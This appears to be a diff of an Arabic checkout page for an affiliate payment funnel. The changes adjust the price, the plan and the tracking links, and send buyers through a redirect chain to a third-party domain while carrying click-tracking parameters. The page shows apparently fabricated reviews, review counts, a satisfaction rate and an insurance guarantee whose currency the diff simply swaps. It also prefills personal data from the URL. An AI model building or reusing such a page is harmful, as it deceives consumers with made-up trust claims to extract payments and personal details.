@@ -44,7 +44,7 @@ font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
 }
 
 .wrap{max-width:1100px;margin:0 auto;padding:18px 14px 60px}
-.safe{background:#0a0a0a;color:#fff;font-size:12px;padding:6px 10px;text-align:right}
+.safe{background:#0a0a0a;color:#fff;font-size:12px;padding:6px 10px;text-align:center}
 .grid{display:grid;grid-template-columns:minmax(0,1fr) 360px;gap:18px}
 @media(max-width:980px){.grid{grid-template-columns:1fr}}
 .card{background:#fff;border:1px solid var(--line);padding:22px;border-radius:12px}
@@ -56,7 +56,8 @@ font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
 .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
 @media(max-width:620px){.form-grid{grid-template-columns:1fr}}
 .input,.select,.el{width:100%;border:1px solid #cfd6e4;border-radius:10px;
-padding:12px;font-size:15px;background:#fff}
+padding:12px;font-size:15px;background:#fff;text-align:right}
+.select{direction:rtl}
 .btn{width:100%;padding:12px;border:none;border-radius:12px;
 background:#16a34a;color:#fff;font-weight:900;cursor:pointer}
 .err{display:none;background:#fff1f1;border:1px solid #f5bcbc;
@@ -84,7 +85,7 @@ border-radius:14px;padding:24px;text-align:center}
 .progress-bar{width:0%;height:100%;
 background:linear-gradient(90deg,#7aa3ff,#2dd4bf);
 animation:loadingBar 2.2s ease-in-out infinite}
-@keyframes loadingBar{0%{width:0%}60%{width:100%}100%{width:100%}}
+@keyframes loadingBar{0%{width:0%}60%{width:80%}100%{width:100%}}
 </style>
 </head>
 
@@ -94,13 +95,13 @@ animation:loadingBar 2.2s ease-in-out infinite}
 sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 </script>
 
-<div class="safe">دفع آمن عبر تشفير SSL</div>
+<div class="safe">دفع آمن عبر بروتوكول SSL</div>
 
 <div class="wrap">
 
 <div class="page-title">
 دفع آمن 🔒 <span class="stars">★★★★★</span>
-<span class="reviews">(2,777 تقييم)</span>
+<span class="reviews">(2,777 مراجعة)</span>
 </div>
 
 <div class="grid">
@@ -113,11 +114,11 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 <img id="heroImg">
 <div>
 <div id="heroTitle" style="font-weight:900;font-size:14px"></div>
-<div class="sub">المنتج من الرابط الخاص بك</div>
+<div class="sub">المنتج من رابطك</div>
 </div>
 </div>
 
-<div class="h2">1. المعلومات الشخصية</div>
+<div class="h2">1. المعلومات</div>
 
 <div class="form-grid">
 <input id="firstName" class="input" placeholder="الاسم الأول" required>
@@ -137,13 +138,13 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 
 <div class="form-grid">
 <select id="phonePrefix" class="select">
-<option value="+966">+966 — السعودية</option>
+<option value="+966">+966 — المملكة العربية السعودية</option>
 </select>
 <input id="phoneNumber" class="input" placeholder="رقم الهاتف" required>
 </div>
 
 <input id="nameInput" type="hidden">
-<button id="nextBtn" class="btn">المتابعة</button>
+<button id="nextBtn" class="btn">متابعة</button>
 
 </section>
 
@@ -153,9 +154,9 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 
 <div class="widget">
 <div style="text-align:center;font-weight:800">آراء العملاء</div>
-<div style="text-align:center;font-weight:700;">فينيلة لارا</div>
+<div style="text-align:center;font-weight:700;">فينيلا لارا</div>
 <div style="text-align:center;color:#f6b80c;">★★★★★</div>
-<p style="text-align:center">استلمت منتجي يوم أمس. تجربة رائعة جداً!</p>
+<p style="text-align:center">استلمت منتجي بالأمس. تجربة رائعة!</p>
 </div>
 
 <div class="widget">
@@ -163,21 +164,21 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 <img id="sidebarImg" style="width:52px;height:52px;border-radius:8px;border:1px solid var(--line);display:none">
 <div>
 <div style="font-weight:800">توصيل سريع</div>
-<div class="sub">3–5 أيام عمل</div>
+<div class="sub">3-5 أيام عمل</div>
 </div>
-<div style="margin-right:auto;font-weight:800">مجاني</div>
+<div style="margin-right:auto;font-weight:800">مجاناً</div>
 </div>
 
 <div style="margin-top:14px;font-weight:800">ملخص الطلب</div>
-<div class="order-row"><span>المجموع</span><span>7.50 ر.س</span></div>
+<div class="order-row"><span>الإجمالي</span><span>ر.س 31.00</span></div>
 </div>
 
 <div class="widget">
 <div style="font-weight:800;margin-bottom:10px">لماذا تثق بنا</div>
 <div class="trust">
 <div class="box"><div>⭐</div><div>99% تقييمات إيجابية</div></div>
-<div class="box"><div>🔒</div><div>تشفير SSL آمن</div></div>
-<div class="box"><div>🛡️</div><div>تأمين بقيمة $250,000</div></div>
+<div class="box"><div>🔒</div><div>آمن عبر SSL</div></div>
+<div class="box"><div>🛡️</div><div>تأمين بقيمة 250,000 جنيه</div></div>
 </div>
 </div>
 
@@ -197,10 +198,6 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 <script>
 const params = new URLSearchParams(window.location.search);
 const affiliateRef = params.get('ref');
-
-if (!affiliateRef) {
-    window.location.replace('https://speaktoheaven.com');
-}
 
 window.addEventListener('DOMContentLoaded', () => {
 
@@ -262,7 +259,7 @@ if (qs.get('sub7')) billingCity.value = d(qs.get('sub7'));
 if (qs.get('sub9')) emailInput.value = d(qs.get('sub9'));
 if (qs.get('sub10')) phoneNumber.value = d(qs.get('sub10')).replace(/[^\d]/g, '');
 
-// CONTINUE TO SECOND PAGE
+// CONTINUE TO RANDOM PAYMENT URL
 nextBtn.onclick = async () => {
   nameInput.value = `${firstName.value} ${lastName.value}`.trim();
 
@@ -273,7 +270,7 @@ nextBtn.onclick = async () => {
 
   try {
     nextBtn.disabled = true;
-    nextBtn.textContent = "جاري إنشاء رابط الدفع الآمن…";
+    nextBtn.textContent = "جاري إنشاء صفحة الدفع الآمنة…";
     overlay.setAttribute("aria-hidden", "false");
 
     const response = await fetch("/api/create-promo-checkout-link", {
@@ -282,10 +279,10 @@ nextBtn.onclick = async () => {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        plan: "4995",
-        step2File: "xo-sa2.html",
-        currency: "GBP",
-        amount: 49.95,
+        plan: "lifetime",
+        step2File: "xo-uk2-ls.html",
+        currency: "SAR",
+        amount: 31.00,
         sourcePage: window.location.href,
 
         firstName: firstName.value.trim(),
@@ -303,7 +300,7 @@ nextBtn.onclick = async () => {
 
         ref: affiliateRef,
         originalQueryString: sessionStorage.getItem("orig_qs") || "",
-        successUrl: "https://cudsr.bemobtrcks.com/go/a0224109-84eb-47be-926c-e1a7232611a7"
+        successUrl: "https://cudsr.bemobtrcks.com/go/40f5ab33-ff2e-46aa-88c8-8fab25a5f548"
       })
     });
 
@@ -313,25 +310,29 @@ nextBtn.onclick = async () => {
       throw new Error(data.error || "تعذر إنشاء رابط الدفع الآمن.");
     }
 
-    let targetUrl;
-    if (data.url.startsWith("http://") || data.url.startsWith("https://")) {
-      targetUrl = new URL(data.url);
-    } else {
-      targetUrl = new URL(data.url, "https://speaktoheaven.com");
+    let nextUrl =
+      "https://www.legendspeak.net" +
+      data.url +
+      "?ref=" + encodeURIComponent(affiliateRef || "") +
+      "&sub1=" + encodeURIComponent(qs.get("sub1") || "") +
+      "&sub2=" + encodeURIComponent(qs.get("sub2") || "") +
+      "&pixel=" + encodeURIComponent(qs.get("pixel") || "") +
+      "&clickid=" + encodeURIComponent(qs.get("clickid") || "") +
+      "&affiliate_source=" + encodeURIComponent(qs.get("affiliate_source") || "");
+
+    const subId = qs.get("sub_id");
+
+    if (subId) {
+      nextUrl += "&sub_id=" + encodeURIComponent(subId);
     }
 
-    if (affiliateRef) targetUrl.searchParams.set("ref", affiliateRef);
-    if (qs.get("sub1")) targetUrl.searchParams.set("sub1", qs.get("sub1"));
-    if (qs.get("sub2")) targetUrl.searchParams.set("sub2", qs.get("sub2"));
-    if (qs.get("sub_id")) targetUrl.searchParams.set("sub_id", qs.get("sub_id"));
-
-    window.location.href = targetUrl.toString();
+    window.location.href = nextUrl;
 
   } catch (error) {
     overlay.setAttribute("aria-hidden", "true");
     nextBtn.disabled = false;
-    nextBtn.textContent = "المتابعة";
-    alert(error.message || "تعذر فتح صفحة الدفع الآمن. يرجى المحاولة مرة أخرى.");
+    nextBtn.textContent = "متابعة";
+    alert(error.message || "تعذر فتح صفحة الدفع الآمنة. يرجى المحاولة مرة أخرى.");
   }
 };
 
